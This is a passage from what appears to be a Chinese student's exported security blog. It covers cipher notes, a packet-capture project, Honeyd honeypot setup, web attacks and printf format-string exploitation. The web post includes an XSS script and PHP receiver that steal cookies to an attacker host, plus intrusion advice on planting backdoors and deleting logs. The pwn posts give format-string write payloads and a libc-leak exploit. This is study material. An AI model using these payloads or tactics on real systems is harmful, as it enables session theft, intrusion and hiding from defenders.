0001000，即为初始状态的之后的第一个状态。依据此规则可演变出多种状态。\n\n④再设定规则，从每个状态中取第x位作为密钥，那么n个状态就会对应生成n位的key。\n\n(2)2D，即二维的：原理类似，给定初始状态与规则。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454153.png)\n\n这里的Von Neumann Neighborhood和Moore Neighborhood对应两种不同的邻居选择规则。\n\n▲规则：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455128.png)\n\n这里的X为自定义的一个初始值0或1，之后的CNSWE分别对应英文certer，north，south，west，east，即中上下左右，加上是一个给定的规则，例如选定：(XCNSWE)为(001110)=14，那么14即为给定的规则。\n\nSi,j(t)即为当前状态分别对应的0或1的值，依据上述等式算出下一状态的值即可。(这里是Von Neumann Neighborhood)\n\n☆针对流密码攻击：插入明文攻击，假设攻击者可以插入1bit的指定明文，再次进行发送，然后也可以截获到密文，那么如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454656.png)  第一次(只知道密文Ci)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455603.png)第二次插入p后(知道密文Ci和p、c)\n\n现在可以通过p^c算出k2，带入第一张图，c2^k2算出p2，再带入第二张图p2^c3算出k3，依次类推可得到全部，除了p1,k1,c1。\n\n \n\n \n\n&第四章 分组密码\n\n1.DES加密(Data Encryption Standard)：\n\n(1)密钥生成：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454854.png)\n\n①64位密钥，其中8位为奇偶校验位，生成子密钥过程中需要剔除，经过PC-1压缩得到k(56bit)\n②将k分为KL0和KR0，各28bit\n③KL0和KR0左移x位得到KL0x,KR0x\n④将KL0x和KR0x合并，通过PC-2置换得到子密钥K0(48bit)\n⑤将KL0x和KR0x拷贝一份得到下一轮的KL1和KR1\n\n重复3-5步16轮，共得到k0-k15个子密钥以供加密\n\n(2)加密流程：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454057.png)\n\n①以8个字母为一个单位取明文\n②将一单位明文通过IT打乱得到Y0\n③取Y0左边32位为PL0,右边32位为PR0\n④将PR0复制一份为L1-------用作下一轮的L\n⑤将PR0用EBOX扩展置换得到EPR0(48bit)\n⑥将EPR0与K0异或得到K_X_P(48bit)\n⑦将K_X_P用SBOX压缩得到SPR0(32bit)\n⑧将SR0与PBOX进行置换得到PPR0\n⑨将PPR0与L0异或得到下一轮的PR1\n\n重复4-9步16轮(其中f轮函数即为EBOX、Key异或、SBOX、PBOX)\n\n▲得到PR15和L15，左右交换后合并在一起后再经过IP逆运算最终置换得到密文\n\n(3)BOX事项：\n\n①EBOX：虽说是扩展，但直接依据顺序扩展即可。前bit->后bit，后bit->前bit。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454861.png)\n\n②SBOX：8个子BOX，每个子BOX为4×16矩阵，每行0-15以某个固定顺序排列，通过时48bit分为8个块，每个块6bit。首尾bit拼合为row，中间4bit拼合为column，依据(row,column)来在每个子BOX中找到对应的数字后转换为二进制即为4bit输出。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454267.png)\n\n之后IP,IP逆,PBOX都是正常的置换BOX。\n\n▲解密流程完全相同，只有密钥使用顺序相反。\n\n \n\n2.SDES加密：Simple，类似，不过只有两轮，位数也不太一样，分别循环左移1bit和2bit。各种子BOX也会对应修改。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454258.png)\n\n \n\n3.AES加密(Advanced Encryption Standard):\n\n▲有128bit，192bit和...忘了...以下以128bit为例子\n\n(1)密钥生成：\n\n①128bit分为16字节竖向排列：\n\n```\n#注释头\n\nW0 W1 W2  W3 ..........\n-------------------------------------------------------\nK0 K4 K8  K12\nK1 K5 K9  K13\nK2 K6 K10 K14\nK3 K7 K11 K15\n```\n\n②依据规则计算W[4]至W[43]：\n\nW[i] = W[i-4] xor W[i-1]     i不为4的倍数时\n\nW[i] = W[i-4] xor T(W[i-1])  i为4的倍数时\n\n▲计算T(W[i-1]):\n\nA.将W[i-1]中字节元素横向排列，循环左移1个字节。\n\nB.将循环左移后的四个字节通过SBOX，得到[S0,S1,S2,S3]四个字节列表。(这个SBOX为16×16矩阵，需要将每个字节的前4bit作为row，后4bit作为column，(row,column)来在SBOX中寻找对应字节替换)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454567.png)\n\nC.计算常量：r[i] = 2^((i-4)/4)\n\nD.最终T(W[i-1]) = [S0 xor r(i),S1,S2,S3]\n\n即可求得W[0]-W[43]共计44个W[i]密钥。\n\n(2)加密流程：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454120.png)\n\n128bit输入，循环9轮，第10轮中没有MixColumn。\n\n(3)BOX注意：\n\n①KeyAdd：正常的128bit密钥和128bit明文块异或。\n\n②Substitution：即SBOX，为\n\n \n\n \n\n \n\n \n\n \n\n \n","tags":["学习"],"categories":["学习"]},{"title":"暑期总结","url":"/2021/08/14/暑期总结/","content":"\n小学期一直在忙小程序的设计，现在放上来吧，也最后做个总结：\n\n一、Libcap的使用：\n\n1.头文件环境相关：\n\n用的是ubuntu18.04的环境\n\n(1)头文件及环境配置：\n\n```c\n//注释头\n\n\n#include <pcap.h>\n\n//cmd Programmer need\n-lpcap\n\n//QT pro need\nLIBS += -L/usr/local/lib -lpcap\n```\n\n同时需要root权限，QT可以设置\n\n(2)QThread使用\n\n```c\n//注释头\n\nclass libcapThread : public QThread\n{\n    Q_OBJECT\npublic:\n    //overwrite\n    void run();\n\n\nsignals:\n    void signalpcap(QString,QString,QString,\n        QString,QString,const u_char*);\n};\n//注释头\n\nthreadObj->start();\nthreadObj->terminate();\n```\n\n2.抓包流程：\n\n(1)搜索网卡dev：\n\ndev = pcap_lookupdev(errbuf);\n\n这个只能搜索到第一个可用网卡，有的装了docker啥的会存在多个网卡，需要用其他函数。\n\n(2)编译抓取规则：\n\npcap_compile(devHandle, &filter, \"tcp\", 0, deviceMask);\n\n(3)设置抓取规则：\n\npcap_setfilter(devHandle, &filter);\n\n(4)抓包：\n\npcap_loop(devHandle, 1, baseAnalyze, NULL);\n\n▲大概就是这样，然后这里一般需要用到回调函数baseAnalyze()来处理包数据，回调函数可自行得到的参数如下：\n\nvoid baseAnalyze(u_char* user, const struct pcap_pkthdr* pHeader, const u_char* pPktdata)\n\n3.然后就是正常处理显示了，直接贴程序:\n\nhttps://github.com/PIG-007/Programmer/tree/master/Libcap\n\n \n\n二、加解密双机的使用：\n\n▲做了双机的服务器端和DES，AES，还有几个古典，其他的是同学做的，特此说明一下。\n\n1.Socket\n\n(1)创建对象：\n\n```c\n//注释头\n\nserver = new QTcpServer(this);\n```\n\n(2)开始监听：\n\n```c\n//注释头\n\nconnect(ui->btnListen,&QPushButton::clicked,[this]{\n    //if Listening,close it\n    if(server->isListening()){\n    //server->close();\n    closeServer();//Define function\n    //Recover the status after closed\n    }else{\n        const QString address_text=ui->editAddress->text();\n        const QHostAddress address=(address_text==\"Any\")\n            ?QHostAddress::Any\n            :QHostAddress(address_text);\n        const unsigned short port=ui->editPort->text().toUShort();\n        if(server->listen(address,port)){\n        //handle function\n        }else{\n            //error function\n        }\n    }\n}\n```\n\n(3)检测到连接，开始处理：\n\n```c\n//注释头\n\nconnect(server,&QTcpServer::newConnection,this,[this]{\nwhile(server->hasPendingConnections())\n{\n    //nextPendingConnection get the next obj\n    QTcpSocket *socket=server->nextPendingConnection();\n    clientList.append(socket);\n    ui->textRecv->append(QString(\"(%1:%2) Soket Connected\")\n        .arg(socket->peerAddress().toString())\n        .arg(socket->peerPort()));\n        ui->textRecv->append(recv_text);\n});\n```\n\n(4)错误信息处理：\n\n```c\n//注释头\n\nconnect(socket, static_cast<void(QAbstractSocket::*)(QAbstractSocket::SocketError)>(&QAbstractSocket::error),\n[this,socket](QAbstractSocket::SocketError)\n{\n//Handle\n});\n//注释头\n\nconnect(socket,&QAbstractSocket::errorOccurred,[this,socket](QAbstractSocket::SocketError)\n{\n//Handle\n});\n```\n\n2.界面设计的不同style:\n\n```c\n//注释头\n\nqApp->setStyle(QStyleFactory::create(\"fusion\"));\n```\n\n3.加密模块：\n\n很多内容就放github上，不再赘述\n\nhttps://github.com/PIG-007/Programmer/tree/master/SocketEncrypt\n\n \n\n","tags":["学习"],"categories":["学习"]},{"title":"护网Web学习","url":"/2021/08/14/护网Web学习/","content":"\n偷溜来了护网，希望不会被逮住.....\n\n▲其实决定来之前压根就不会Web，连HTML，CSS，PHP等等最基础的东西都不了解。决定要来之后，就抽空学了一些简单的实际渗透方面的Web利用，像之前写的永恒之蓝，sqlmap，nmap，Burpsuite，ARP啥的都是那一小段时间疯狂补的东西。然后期间经历了一点小插曲，本来以为不会来了，阴差阳错又过来了。和我一位学Web开发的傻嘚一起来的\n\n一、HTML、CSS、PHP基础：\n\nhttps://www.w3school.com.cn/\n\n东西太杂，适当了解原理，以后即用即学。\n\n \n\n二、XSS攻击：跨站脚本（Cross-Site Scripting），四种类型，大概如下\n\n1.原理解析：\n\n(1)黑客通过某网站漏洞，将恶意代码注入到某网站中，生成类似图片，留言等进行伪装，内在是攻击链接。\n\n(2)用户访问该网站，无意中点击了该图片，留言，那么就执行了这段恶意代码，进入了攻击链接，泄露信息。\n\n2.例子：\n\n(1)原网站的HTML：\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>xss攻击</title>\n</head>\n<body>\n<form action=\"./test.php\" method=\"post\">\n留言：<input type=\"text\" name=\"content\" value=\"\"><br/>\n<input type=\"submit\" name=\"\" value='提交'>\n</form>\n<br/>留言记录：<br/>\n```\n\n后缀改为html，打开后如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450943.png)\n\n(2)攻击者通过某些手段修改后如下：\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>xss攻击</title>\n</head>\n<body>\n<form action=\"./test.php\" method=\"post\">\n留言：<input type=\"text\" name=\"content\" value=\"\"><br/>\n<input type=\"submit\" name=\"\" value='提交'>\n</form>\n<br/>留言记录：<br/>\n\n<script>\nvar Str=document.cookie;                        //获取cookie\nvar a =document.createElement('a');             //创建a标签\na.href='http://1.1.1.1/attack.php?'+Str;        //攻击者主机\na.innerHTML=\"<img src='./aa.jpg'>\";             //掩护图片\ndocument.body.appendChild(a);                   //将标签添加到页面中\n</script>\n</body>\n</html>\n```\n\n打开后如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450848.png)\n\n(3)当不小心点到该图片后，会跳转到http://1.1.1.1/attack.php?Str这个URL界面，跳出如下界面：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450006.png)\n\n其中array中就是访问该网站所得到的cookie令牌。\n\n攻击者的attack.php代码如下：\n\n```\n<?php\nheader(\"content-type:text/html;charset=utf8\");\necho \"你的PHPSESSID被盗啦\";\necho \"<pre>\";\nprint_r($_GET);\necho \"</pre>\";\n$cookie=$_GET['PHPSESSID'];\nfile_put_contents('./xss.txt', $cookie);\n?>\n```\n\n攻击者将得到的cookie存储到他服务器1.1.1.1的xss.txt文件中，之后攻击者就可以利用从用户这得到的cookie来假装用户成功登录网站。\n\n3.防御手段：过滤输入，最有效的。\n\n \n\n三、CSRF攻击：跨站请求伪造（Cross-site request forgery）\n\n1.原理解析：\n\n(1)用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；\n\n(2)在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；\n\n(3)用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B，这个网站B就是黑客用来攻击的自己搭建的一个网站，或者是黑客插入攻击代码的网站；\n\n(4)访问网站B后，接收到用户请求后(黑客插入的链接或者是黑客自建的网站，前者需要用户点击恶意代码链接，类似于XSS攻击，后者则不需要)，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；\n\n(5)浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。\n\n▲简单来说就是利用恶意网站使得用户浏览器携带cookie和恶意代码请求来登录正常网站，这样黑客的恶意代码请求就可以在该网站被执行，从而使得黑客可以伪装成用户来执行任意操作，事后看到的也只是该用户的正常请求操作，基本没有什么攻击痕迹。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450927.png)\n\n2.实例解析：\n\n不搞了，DVWA上很多。\n\n \n\n四、SSRF攻击：Server-Side Request Forgery，服务端请求伪造\n\n1.原理解析：比较简单，常用来外网将服务器当跳板来探测内网。\n\n(1)利用服务器提供的功能，输入url获取图片，输入某ip查找信息等等。\n\n(2)构造我们需要的url，或者一些链接，服务来获取我们想要知道的信息。\n\n2.实例解析：\n\n不搞了，DVWA上很多。\n\n后面有时间再总结下吧，得滚去补落下的东西了。\n\n \n\n五、总结一下学到的朔源：\n\n1.首先得到ip，先挂clash和proxifier全局代理安排上。\n\n2.IPIP.net  ip138.com等查该ip下面绑了啥域名，对应开了什么web服务。\n\n3.先Ping一下IP绑定的域名，看看最终的web服务是不是挂在该IP下。然后拿目录扫描器开始扫这个ip开的web服务，需要字典和工具。\n\n4.根据扫描结果或经验，尝试看看能不能找到后台管理的登录页面，先尝试一波弱口令，SQL注入什么的。\n\n5.现在就可以尝试分析这个Web服务的CMS架构，找出来之后就可以找对应版本漏洞打打试试，尝试拿Webshell。\n\n6.经过艰苦不懈的尝试，再加上运气，可能就能拿Webshell了。这时候进入他的Web服务中，尝试提权什么的，一句话木马，各种小工具啥的上就完了。\n\n7.搞了一堆也不太好使的话，那就可能要被发现了，这时候不要慌，走之前删一删Web服务上无关紧要的小图片，小链接什么的，然后尝试删记录退出啥的。\n\n8.哎，这时候就可以打个游戏，吃个饭，睡个觉，第二天再来尝试看看，如果运气好没被堵上漏洞，那就看看日志，这兄弟的一些恢复操作就能完整被我们知道，然后根据这些日志来找账户密码，或者是一些系统操作调用啥的，方便我们拿到更高级的权限。\n\n9.运气再好些拿到高权限的shell后，种个后门木马就跑路呗，记得删日志。\n\n(像那种挂了很多域名，提供了看似正常的Web服务的，有很大可能是个用来翻墙洗白流量的服务器，这种服务器一般比较好拿权限，因为使用者一般挂完服务后都不会再投入过多精力去管的)\n\n▲CMS啥的常规不管用，就扫端口，尝试端口服务漏洞直接爆破，再牛逼点，使用0day打。再再牛逼点，直接现场挖对应版本服务的漏洞(pwn大佬干的活)。\n\n \n\n▲再补一下护网对USG写的脚本，是同学写的，版权在他那里，特此声明。本来自己想写另一个解析HTML的脚本却怎么也不成功，水平还是太差：\n\n```\n#注释头\n\nimport json\nimport winsound\nimport requests\nimport time\n\nrequests.packages.urllib3.disable_warnings()\n\nurl = \"https://10.10.10.1/=========================\"\n\nheaders = {\n    \"Accept\": \"application/json, text/javascript, */*; q=0.01\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\",\n    \"Cache-Control\": \"max-age=0\",\n    \"Connection\": \"keep-alive\",\n    \"Cookie\": \"=======================================\",\n    \"Host\": \"10.10.10.1\",\n    \"Sec-Fetch-Dest\": \"document\",\n    \"Sec-Fetch-Mode\": \"navigate\",\n    \"Sec-Fetch-Site\": \"none\",\n    \"Sec-Fetch-User\": \"?1\",\n    \"Upgrade-Insecure-Requests\": \"1\",\n    \"User-Agent\": \"========================================\",\n}\n\nrecorded_ips = set()\n\nwith open(\"blacklistips.txt\", \"r\") as f:\n    recorded_ips = set(f.read().splitlines())\n\nwhile True:\n\n    try:\n        print(time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(time.time())))\n\n        doc = requests.get(url=url, headers=headers, verify=False)\n\n        if doc.status_code != 200:\n            winsound.Beep(2000, 2000)\n            print(\"无法访问\")\n            time.sleep(10)\n            continue\n\n        json_dict = json.loads(doc.text)\n        data = json_dict[\"data\"]\n        for attack in data:\n            ip = attack[\"name\"]\n            hasRisk = (\n                int(attack[\"middle\"]) > 0\n                or int(attack[\"high\"]) > 0\n                or int(attack[\"critical\"]) > 0\n            )\n\n            if not hasRisk:\n                continue\n\n            if ip in recorded_ips:\n                continue\n\n            print(attack)\n            winsound.Beep(2000, 2000)\n            recorded_ips.add(ip)\n\n        with open(\"blacklistips.txt\", \"w\") as f:\n            for data in recorded_ips:\n                f.write(data + \"\\n\")\n        print(\"平平安安\")\n        time.sleep(30)\n\n    except Exception as err:\n        print(err)\n        winsound.Beep(2000, 2000)\n        time.sleep(10)\n```\n\n \n\n▲最后做个总结，学了这些天下来，感觉Web太杂太乱，边边角角太多，而且更新速度极快，可能过个一两个月就过时的，实在是不适合像我这种又蠢又懒，脑容量又小的菜鸡去搞。\n\n还是感觉现在深入搞Web不到时候，在校期间更适合学些基础理论的东西，所以之后还是回老本行搞二进制去吧，起码这些理论知识更新换代比较慢一点。并且这种更新更像是一种基于理论来千变万化的，而不像Web好多都是那种一更新就完全变成新东西，没多少理论依据可言，直接就是开脑洞的。\n\n还是搞二进制去吧，黑客的理想还是等以后工作了再来。\n","tags":["WEB"],"categories":["WEB"]},{"title":"蜜罐搭建","url":"/2021/08/14/蜜罐搭建/","content":"\n环境：虚拟机ubuntu18.04。\n\n1.安装前置依赖：\n\n```\nsudo apt-get install g++ gcc\nsudo apt-get install flex\nsudo apt-get install bison\nsudo apt-get install libedit-dev\n```\n\n2.下载前置工具：\n\n```\n#注释头\nlibevent-1.4.14b-stable.tar.gz   \nlibdnet-1.11.tar.gz              \nlibpcap-1.1.1.tar.gz             \narpd-0.2.tar.gz\n#注释头\n\nhttp://libevent.org/\nhttp://libdnet.sourceforge.net/\nhttp://www.tcpdump.org/release/\nhttp://www.citi.umich.edu/u/provos/honeyd\n```\n\n3.安装工具：基本都是编译三部曲\n\n(1)安装Libevent(非同步事件通知的函数库)：使用libevent，可以设定某些事件发生时所执行的函数，用来代替程序所使用的循环检查。\n\n```\n#注释头\n\nsudo tar -zxvf libevent-1.4.14b-stable.tar.gz\ncd libevent-1.4.14b-stable\nsudo ./configure\nsudo make\nsudo make install\n```\n\n(2)安装Libdnet(提供跨平台的网络相关的API函数库)：包括了ARP缓存，路由表查询，IP包及物理帧的传输等。\n\n```\n#注释头\n\nsudo tar -zxvf libdnet-1.11.tar.gz\ncd libdnet-1.11\nsudo ./configure\nsudo make\nsudo make install\n```\n\n(3)安装Libpcap：一个数据包捕获函数库，大多数网络软件都以它为基础\n\n```\n#注释头\n\nsudo tar -zxvf libpcap-1.1.1.tar.gz\ncd libpcap-1.1.1\nsudo ./configure\nsudo make\nsudo make install\n```\n\n之前装的依赖 flex bison就是为了这个。\n\n(4)安装ARPD（运行在与Honeyd相同的系统上）：arpd是honeyd众多协作工具中最重要的一个工具。工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中arpd可以指定IP地址，将该系统下的MAC地址伪装成指定IP的MAC地址，这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机，然后对蜜罐主机进行相关的设置，就可以诱导攻击，截取流量。\n\n```\n#注释头\n\nsudo tar -zxvf arpd-0.2.tar.gz\ncd arpd-0.2\nsudo ./configure\n#报错：error：expected’)’ before string constant\n#解决：在arpd.c文件中添加#define __FUNCTION__ \"\" #vim arpd.c添加定义\nsudo make\nsudo make install\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452748.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452811.png)\n\n4.安装蜜罐工具Honeyd：\n\n```\n#注释头\n\nsudo tar -zxvf honeyd-1.5c.tar.gz\ncd honeyd-1.5c\nsudo ./configure\n#报错：configure: error: Couldn't figure out how to access libc\n#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so\nsudo make\nsudo make install\n```\n\n5.先将arpd运行起来：\n\n(1)运行后显示链接不存在：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452140.png)\n\n(2)解决办法：找到libevent-1.4.so.2的位置，然后将位置加到定位的文件中\n\nwhereis libevent-1.4.so.2\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452134.png)\n\nsudo vim /etc/ld.so.conf\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452265.png)\n\nsudo ldconfig #重新加载链接\n\n(3)之后选定网卡，即可模拟IP，伪装IP的MAC地址\n\nsudo arpd -i ens33 192.168.1.71\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452193.png)\n\n▲这里的ens33是ubuntu下用ip addr查到的，不同系统可能不同。\n\n6.检测Honeyd是否可以运行：\n\n(1)设置启动参数vim honeyd.conf：\n\n```\n#注释头\n\n# Example of a simple host template and its binding\ncreate windows\n\n#创建一个windows xp系统的蜜罐\nset windows personality \"Microsoft Windows XP Professional SP1\"\n\n#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.sh\nadd windows tcp port 80 \"sh /home/hacker/Desktop/Web/Honey/honeyd-    1.5c/scripts/web.sh\"\n\n#关闭默认的tcp,udp连接\nset windows default tcp action reset\nset windows default udp action reset\n\n#将windows这个蜜罐的ip绑定为192.168.40.150\nbind 192.168.40.150 windows\n```\n\n▲注意这里面设置的IP是在局域网下的，且还没有被DHCP分配出去的可用IP。同时设置了该IP主机下的80端口，这样其他用户在访问该IP的80端口时就会运行(Web访问)\n\nsh /home/hacker/Desktop/Web/Honey/honeyd- 1.5c/scripts/web.sh\n\n这条命令，然后返回相应的信息。\n\n(2)设置web.sh脚本(这可以随便设置，制作一个web前端即可，常用来钓鱼)，在honeyd.conf中设置路径：在scripts下原本存在一个自带的脚本，该脚本被其他人访问运行成功后呈现如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452534.png)\n\n(3)启动蜜罐honeyd：\n\nhoneyd -d -f honeyd.conf 192.168.1.2\n\n▲这样一个蜜罐就搭建起来了，需要注意的是搭建步骤大概分为以下几步：\n\n①利用arpd虚拟IP。\n\n②在honey的启动参数中，也就是honey.conf中绑定虚拟的主机到虚拟IP。\n\n③在honey.conf中设置虚拟主机的相关端口，协议等参数。\n\n④设置端口连接后的返回信息，类似于80端口的web.sh，或者ssh连接端口的页面等等。\n\n⑤启动honey，等待鱼儿上钩。\n\n \n\n参考资料：\n\nhttps://www.dazhuanlan.com/2019/12/17/5df842503e7a9/\n\nhttps://blog.csdn.net/accepthjp/article/details/46399715\n\nhttps://blog.csdn.net/zhangxuechao_/article/details/80261502\n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"格式化字符printf汇总","url":"/2021/08/14/格式化字符printf汇总/","content":"\n▲printf的性质：\n\n▲参数%s：这个参数其本质上是读取对应的参数，并作为指针解析，获取到对应地址的字符串输出。可以通过这个性质来泄露某个内存地址的内容：\n\n例子：\n\n如果输入一个%S，在调用printf之前，栈上会是这种数据，有两个相同的指向%S，一个是会解析成参数%S，一个会使用解析的参数%S作用来打印输入的%S。这里可以计算出偏移量为6，即从栈顶数第6个可以到达我们输入的内容0x0a7325。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191542914.png)\n\n \n\n1.泄露任意地址内容\n\n```\n#注释头\n\n\\x01\\x80\\x04\\x08%x.%x.%x.%x.%s\n```\n\n这一段即打印从栈顶往下数5个内容的栈中保存的值，由于第5个参数是%s，所以会将第5个内容当作一个地址来解析，从而打印位于该地址上的值。所以输出应该为0xff95abb4,0x0000012B,0x08048465.....(这都是栈上的内存),最后第五个内容是0x08040801，用参数%s来解析，即打印该地址上保存的内容，地址对应的值为”ELF\\x01\\x01\\x01\\n”，这样就可以打印任意内存地址的值。常用来传入got表地址，然后借助该函数泄露某函数got表中的值，即是泄露该函数的真实地址。\n\n▲简化使用：\n\n如果输入的参数保存在栈上很远的位置，那么则需要叠加%x，但是实际中可以使用简单的偏移来打印：\\x01\\x80\\x04\\x08%5$s，其中5就代表从esp开始计算偏移量为6。\n\n总的来说就是一个公式，输出偏移量为n的参数的值就是：\n\n%(n-1)$s\n\n(%[addr_offset_value]$[格式化控制字符])\n\n \n\n2.任意地址可写：\n\n特殊格式化字符%n家族：\n\n(1)这个字符会将已经输出的字符数写入到指定内存中，例如\\x8c\\x97\\x04\\x08%[addr_offset_value]$n，这段格式化字符串会使得地址0x0804978c处的内容变成4，因为这代表了输出了\\x8c\\x97\\x04\\x08这四个字符，所以会向0x0804978c这个地址写入4，实际是写入00 00 00 04，共计四个字节。利用这个特性可以修改某个地址的值。\n\n(2)\\x8c\\x97\\x04\\x08%2048c%(addr_offset_value)$n：这个代码会将2052，实际是(00 00 08 04) ，共计四个字节写入到地址0x0804978c，因为调用了printf会先打印\\x8c\\x97\\x04\\x08四个字符，然后依据格式化字符%2048c，再打印2048个空字符，实际打印了2048+4=2052个字符，对应16进制为0x804，所以在使用是需要减去在%这个格式化字符标志前的字符的个数才是对应的值。\n\n(3)但是在实际中，如果我们想将一个地址的值写入到某个地址，使得可以调用，那么我们需要输入的就会变成0x8xxx....转换成十进制则会特别大，会向服务器发送0x8000...个字符，这在实际中很容易出错。这时候需要用到另一个格式化字符控制：%hhn。\n\n(4)特殊格式化字符%hhn：这个字符可以使得一次往指定地址写入一个字节。所以我们可以将我们需要输入的地址给拆分成4个字节来输入。\n\n(5)例如\n\n\\x78\\x97\\x04\\x08\\x79\\x97\\x04\\x08\\x7a\\x97\\x04\\x08\\x7b\\x97\\x04\\x08%16c%5$hhn%99c%6$hhn%129c%7$hhn%4c%8$hhn\n\n这个格式化字符串相当于四个操作：\n\n①\\x78\\x97\\x04\\x08%16c%5$hhn：改变地址0x08049778的值为0x20。\n\n这里是20是因为前面已经输出了\\x78\\x97\\x04\\x08\\x79\\x97\\x04\\x08\\x7a\\x97\\x04\\x08\\x7b\\x97\\x04\\x08总共16个字符，所以实际写入到地址0x08049778的值为16+16=32=0x20。\n\n②\\x79\\x97\\x04\\x08%99c%6$hhn:改变地址0x08049779的值为99+32=131=0x83，同理，因为前面已经输出了32个字符，所以最终写入值为0x83。\n\n③\\x7a\\x97\\x04\\x08%129c%7$hhn：改变地址0x0804977a的值为129+131=260=0x104，这里由于是使用%hhn，所以只能写入一个字符，也就是会被截断为0x04\n\n④\\x7b\\x97\\x04\\x08%4c%8$hhn：改变地址0x0804977b的值为4+0x104=0x108=0x08。所以最终写入到地址0x08049778中的四个字节为0x08048320，完成写入地址。\n\n总的公式:\n\n[addr]%[padding_count]c%[addr_offset_value]$[格式化控制字符]\n\n▲注意偏移量一直在递增。还有就是因为这是大端存储，所以写入的顺序需要计算一下，防止出现\\x00导致字符串输入截断。\n\n \n\n▲特殊格式化字符串调用类：Fmtstr\n\n以上的可以直接改成：fmtstr_payload(5, {printf_got_addr:system_plt})将栈上偏移量为6的值改成printf_got_addr，同样将printf_got_addr的值修改为system_plt_addr。也就是在第一次用pringtf时，会修改栈和劫持printf_got_addr为system_plt_addr。下一次再调用printf时，从printf_got_addr指向的就会是system_plt_addr，完成劫持。\n\n但是如果一旦printf_got_addr出现\\x00或者不同输入函数所对应的非法字符，就会发生截断，导致出错。因为Fmtstr模块创造的payload中地址会被切割成几段，相当于我们的多段执行，那么最后的几个地址如果其中一个带了非法字符就会出错。\n\n \n\n▲printf函数的格式化字符串常见有\n\n(1)%d，%f，%c，%s，（用于读取内存数据）\n\n(2)%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）\n\n(3)除了%n，%hn，%hhn，%lln，分别对应写入目标空间4字节，2字节，1字节，8字节。\n\n▲由于使用%n之类的控制字符，输入的str(addr)为以字符串形式输入，也就是说会转换成十进制然后转换成对应的ascii码来存储在栈上，所以不会出现0x00这类的字符。但是如果是需要写入的地址，使用的是p64或者p32，这个就是直接对应的，如果这个地址中有00，那么就不会被read函数读取进入。因为read函数默认结尾是0x00，也就是字符串结束符号。所以这种情况下一般都是将p64(addr)放在payload的末尾，从而自动生成00，不会导致被截断。\n\n \n\n★技巧总结:\n\n1.劫持某函数为system函数时，是将Got表劫持为plt表，并且该函数的总体结构应该与system函数类似，参数应该是一个地址。\n\n2.fmtstr模块的用法需要注意，有时候也不太好用。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"通过栈溢出获取libc地址汇总","url":"/2021/08/14/通过栈溢出获取libc地址汇总/","content":"\n一、使用LibcSearch\n\n \n\n二、使用DynELF来泄露：\n\n1.使用write函数，三个参数布局\n\n★32位程序：直接在栈上给出参数\n\n直接让write返回到start函数初始化程序(多用于栈溢出字节数较少)\n\n```\n#注释头\n\ndef leak(addr):\n#io.recv(),看具体情况是否要先接收\n    payload = ''\n    payload += 'A'*n #padding\n    payload += p32(write_addr) #调用write\n    payload += p32(start_addr) #write返回到start，恢复栈\n    payload += p32(1) #write第一个参数fd\n    payload += p32(addr) #write第二个参数buf\n    payload += p32(8) #write第三个参数size\n    io.sendline(payload)\n    data = io.recv()[:8] #接受内容读取通过write打印的地址\n    print(\"%#x -> %s\" %(addr, (data or '').encode('hex')))\n    #这里打印不需要也可以，只是可以打印出来让我们看到write打印了什么地 址，基本都打印了\n    return data\n    #这里return的data有很多地址，需要通过之后的DynELF来lookup对应的 